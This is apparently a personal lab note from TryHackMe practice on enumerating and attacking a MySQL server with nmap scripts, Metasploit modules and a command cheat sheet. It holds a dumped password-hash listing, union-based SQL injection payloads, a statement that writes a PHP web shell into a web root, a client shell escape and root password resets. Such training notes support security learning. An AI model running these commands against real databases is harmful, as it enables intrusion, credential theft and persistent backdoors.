## Pre-requisite --> [[tryhackme/services/enumeration]]

## MySQL enumeration practically:

we're going to assume that you found the **credentials: "root:password"** while enumerating subdomains of a web server.

### Requirements
```python
sudo apt install default-mysql-client
```

## Manual enumeration:
>Scanning with nmap:
```sh
nmap -sT -A 10.10.19.225
```

![[MySQL1.png]]

### Connect

#### Local
```sh
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```

#### Remote
```sh
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```

**Example** - 
```sh
mysql -h 10.10.19.225 -u root -p
```
   ![[MySQL2.png]]
   We had used above credentials(root:password) for login purpose and now we exit from this session with "exit" command.

>Finding the username with nmap script:
```sh
nmap -p 3306 --script=mysql-enum 10.10.19.225
```
   ![[MySQL3.png]]

### External Enumeration
>Some of the enumeration actions require valid credentials
```sh
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```


## Metasploit enumeration:
**Above two steps is same in this phase**

```python
msf6 > search mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) > options
msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.19.225
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.19.225

[*] 10.10.19.225:3306 - Sending statement: 'select version()'...
[*] 10.10.19.225:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed

```
**Result** - We get the version of database that is running on the server.

#### MySQL hashdump to find the username with hashes:
```python
msf6 auxiliary(scanner/mysql/mysql_schemadump) > use auxiliary/scanner/mysql/mysql_hashdump
msf6 auxiliary(scanner/mysql/mysql_hashdump) > options
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.19.225
RHOSTS => 10.10.19.225
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 10.10.19.225:3306     - Saving HashString as Loot: root:
[+] 10.10.19.225:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.19.225:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.19.225:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.19.225:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.19.225:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.19.225:3306     - Scanned 1 of 1 hosts (100% complete)

```
Now, we can crack the hash with john the ripper and login with ssh. 

### [**Brute force**](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#mysql)
>Write any binary data
```sh
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```

### MySQL commands
```sh
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```sh
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```

### MySQL Permissions Enumeration
```sh
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root'; 
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```

